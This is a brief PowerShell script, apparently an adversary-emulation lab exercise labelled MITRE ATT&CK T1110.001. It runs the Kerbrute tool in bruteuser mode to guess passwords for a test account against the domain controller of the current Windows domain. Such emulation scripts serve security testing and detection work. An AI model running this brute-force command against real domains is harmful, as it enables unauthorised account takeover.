# By Threats Experts University
# Technique: T1110.001 - Password Guessing
# Task: Password Brute User using Kerbrute Tool
# Requirement/s: Download bruteuser.txt and kerbrute.exe, see documentation for instructions.

cd $env:temp
.\kerbrute.exe bruteuser --dc $ENV:userdnsdomain -d $ENV:userdomain $env:temp\bruteuser.txt TestUser1